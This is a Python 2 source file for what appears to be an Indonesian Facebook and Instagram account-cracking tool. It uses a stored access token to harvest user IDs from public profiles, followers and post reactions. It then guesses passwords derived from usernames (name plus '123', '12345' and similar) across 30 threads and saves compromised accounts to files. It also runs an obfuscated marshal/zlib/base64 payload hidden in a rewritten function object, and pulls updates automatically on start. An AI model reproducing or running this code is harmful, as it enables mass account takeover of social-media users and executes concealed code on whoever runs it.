        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s [𔙃] Salah sayang "%(M));jeda(2);uas()

# cek ingfo sc
def info_tools():
    os.system('clear')
    print ' %s[%s☆%s]'%(N,M,N), 60 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    print '\n %s[%s⸙%s] Perubahan : dari ZAFI menjadi RMA'%(N,M,N);time.sleep(0.07)
    print '\n %s[%s⸙%s] Author    : Romi Afrizal'%(N,M,N);time.sleep(0.07)
    print '\n %s[%s⸙%s] Github    : https://github.com/Rj-Basalamah'%(N,M,N);time.sleep(0.07)
    print '\n %s[%s⸙%s] Editor    : RMA'%(N,M,N);time.sleep(0.07)
    print '\n %s[%s⸙%s] Facebook  : https://www.facebook.com/Rj.Basalamah'%(N,M,N);time.sleep(0.07)
    print '\n %s[%s⸙%s] Instagram : https://www.instagram.com/ing.rouf'%(N,M,N);time.sleep(0.07)
    print '\n %s[%s⸙%s] Version   : 1.2'%(N,M,N);time.sleep(0.07)
    print '\n %s[%sNB%s] : Script ini aku ambil dari zafi dan tidak di perjual belikan :)'%(N,M,N);time.sleep(0.07)
    print '\n %s[%s☆%s]'%(N,M,N), 60 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sKEMBALI%s ] '%(K,N));menu() 

# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print ("%s [™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Token invalid "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s [™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Token invalid "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(M))
    banner()
    print ('\n %s﹡[ welcome %s%s%s ] ⸙ %s\n ╔──────────────────────────────────────────╗' %(P,K,nama,P,M))
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 1. Dump id public %s          ║ '%(M,P,K,P,M)) 
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 2. Dump id followers  %s      ║'%(M,P,K,P,M)) 
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 3. Dump id reaction post%s    ║'%(M,P,K,P,M))
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 4. Crack cari nama (IG)%s     ║ '%(M,P,K,P,M))
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 5. %sStart crack %s             ║'%(M,P,K,P,H,M)) 
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 6. Setting user agent%s       ║'%(M,P,K,P,M)) 
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 7. Cek hasil crack%s          ║'%(M,P,K,P,M)) 
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 8. Profil %sRMA %s              ║'%(M,P,K,P,H,M))
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 9. Info script%s              ║'%(M,P,K,P,M))
    print (' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 0. Hapus token %s             ║'%(M,P,M,P,M))
    print (' %s╠──────────────────────────────────────────╝%s'%(M,M)) 
    unik = raw_input(' %s║%s 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞%s\n ╠%s [༊] 𝙈𝙚𝙣𝙪 : %s'%(M,P,M,P,K))
    if unik == '':
        print("%s ╚[𔙃] Salah sayang "%(M));jeda(2);menu()
    elif unik in['1','01']:
        publik(romz)
    elif unik in['2','02']:
        followers(romz)
    elif unik in['3','03']:
        postingan(romz)
    elif unik in['4','04']:
    	igg()
    elif unik in['5','05']:
        ngentod().romiy()
    elif unik in['6','06']:
    	useragent()
    elif unik in['7','07']:
    	print "%s ╠──────────────────────────────────────────► \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 1. Hasil crack akun %sfacebook "%(M,P,B,P,B)
        print "%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 2. Hasil crack akun %sinstagram "%(M,P,M,P,M)
        c = raw_input('%s ╠──────────────────────────────────────────► \n ║ %s 𝙿𝚒𝚕𝚒𝚑𝚊𝚗 𝚂𝚊𝚕𝚊𝚑 𝚂𝚊𝚝𝚞 %s\n ╚%s[%s⸙%s] Menu : %s'%(M,P,M,P,B,P,K))
    	hasill(c)
    elif unik in['8','08']:
        os.system("xdg-open https://www.facebook.com/rj.basalamah")
    elif unik in['9','09']:
        info_tools()
    elif unik in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('%s \n ╚%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] berhasil terhapus '%(M,H));exit()
    else:
        print("%s ╚[𔙃] Salah sayang "%(M));jeda(2);menu()
def hasill(c):
	if c in[""]:
		print ("%s╚%s[%s𔙃 %s] Salah sayang"%(M,P,M,P));exit()
	elif c in["1","01"]:
		try:
			dirs = os.listdir("hasil")
			print ("")
			for file in dirs:
				print("%s ╔%s───╼ %s%s"%(M,K,P,file));jeda(0.2)
			print(" %s║\n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] cth : CP-%s-%s-%s%s"%(M,P,M,P,ha,op,ta,".txt"))
			file = raw_input("%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] masukan file : "%(M,P));jeda(0.2)
			if file == "":
				print("%s ╚[𔙃] file tidak ada "%(M))
			total = open("hasil/%s"%(file)).read().splitlines()
			print(" %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] ────────────────────────────────►"%(M,P,K,P));jeda(2)
			nm_file = ("%s"%(file)).replace("-", " ")
			jalan(" %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] total akun : %s"%(M,P,K,P,len(total)))
			print(" %s╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] ────────────────────────────────►"%(M,P,K,P));jeda(2)
			for akun in total:
				fb = akun.replace("\n","")
				tling  = fb.replace(" ᡁ───╼ ", " ᡁ───╼").replace(" ᡁ───╼", " ᡁ───╼ ")
				print(tling);jeda(0.03)
			print(" %s╔%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] ────────────────────────────────►"%(M,P,K,P));jeda(2)
			raw_input('%s ║ %s𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚂𝚊𝚕𝚒𝚗 𝙷𝚊𝚜𝚒𝚕 𝙲𝚛𝚊𝚌𝚔\n %s╚%s[ %senter %s] '%(M,P,M,P,K,P));menu()
		except (IOError):
			print("%s ║\n ╠[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] tidak ada hasil "%(M))
			raw_input('%s ║ %s𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙲𝚛𝚊𝚌𝚔 𝙸𝙳 𝚕𝚊𝚐𝚒 \n%s ╚%s[ %senter %s] '%(M,P,M,P,K,P));menu()
	elif c in["2","02"]:
		print "%s ╔──────────────────────────────────────────► \n ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] 1. Hasil crack akun %sOK "%(M,P,H)
        print "%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] 2. Hasil crack akun %sCP "%(M,P,K)
        while True:
        	rom = raw_input('%s ╠──────────────────────────────────────────►\n ║%s 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝚂𝚊𝚝𝚞%s \n ╠%s[%s༊%s] 𝙈𝙚𝙣𝙪 : %s'%(M,P,M,P,B,P,K))
		if rom in['1','01']:
			try:
				oke = open("okeh.txt", "r").readlines()
				print(" %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] %s────────────────────────────────►"%(M,P,K,P,M));jeda(2)
				jalan(" %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] total akun : %s%s"%(M,P,K,P,H,str(len(oke))))
				print(" %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] %s────────────────────────────────►%s"%(M,P,K,P,H,M));jeda(2)
				okek = open("okeh.txt", "r").read()
				print (okek)
				exit(" %s⸙%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] %s────────────────────────────────►"%(O,P,K,P,M));jeda(2)
			except IOError,KeyError:
				exit (M+" ║ 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙲𝚛𝚊𝚌𝚔 𝙻𝚊𝚐𝚒\n ╚[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] tidak ada hasil") 
		elif rom in['2','02']:
			try:
				cepe = open("cepeh.txt", "r").readlines()
				print(" %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] %s────────────────────────────────►"%(M,P,K,P,M));jeda(2)
				jalan(" %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] total akun : %s%s"%(M,P,K,P,K,str(len(cepe))))
				print(" %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] %s────────────────────────────────►%s"%(M,P,K,P,M,K));jeda(2)
				cepek = open("cepeh.txt", "r").read()
				print (cepek)
				exit(" %s⸙%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] %s────────────────────────────────►"%(O,P,K,P,M));jeda(2)
			except IOError,KeyError:
				exit (M+" ║ 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙲𝚛𝚊𝚌𝚔 𝙻𝚊𝚐𝚒 \n ╚[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] tidak ada hasil") 
		else:
			exit()
def igg():
	print ("%s ╠──────────────────────────────────────────►\n ║%s 𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙽𝚊𝚖𝚊 \n%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] Cth nama %s: %sRma "%(M,P,M,P,M,P,M,K))
	usr_ = raw_input('%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Input nama > %s'%(M,P,K))
	jumlah = input('%s ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Limit user > %s'%(M,P,K))
	bff_2 = usr_.replace(" ", "")
	cr.append("romi_afrizal")
	mi.append(bff_2+"|"+bff_2)
	mi.append(bff_2+"_"+"|"+bff_2)
	for _i_ in range(1, jumlah+1):
		mi.append(bff_2+str(_i_)+"|"+bff_2)
		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
	print '%s ╠────────────────────────────────────────────────────► \n ║ %s𝙲𝚛𝚊𝚌𝚔 𝙱𝚎𝚛𝚓𝚊𝚕𝚊𝚗 ⸙ 𝚃𝚎𝚔𝚊𝚗 %s𝙲𝚃𝚁𝙻 + 𝚉%s 𝚞𝚗𝚝𝚞𝚔 𝚂𝚝𝚘𝚙 %s \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sOK%s tersimpan di >%s okeh.txt'%(M,P,H,P,M,P,K,P,H,P,H);jeda(0.2)
	print '%s ╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sCP %stersimpan di > %scepeh.txt\n'%(M,P,K,P,K,P,K);jeda(0.2)
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_bff_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_bff_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							_bff_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
					else:
						_bff_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							_bff_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_bff_.append(_m_)
				else:
					_bff_.append(_i_[0]+"123")
					_bff_.append(_i_[0]+"12345")
					_bff_.append(_o_)
				log.submit(crack2, _o_, _bff_)
			except: pass
	exit("%s• finished"%(H))
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
      
if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()    
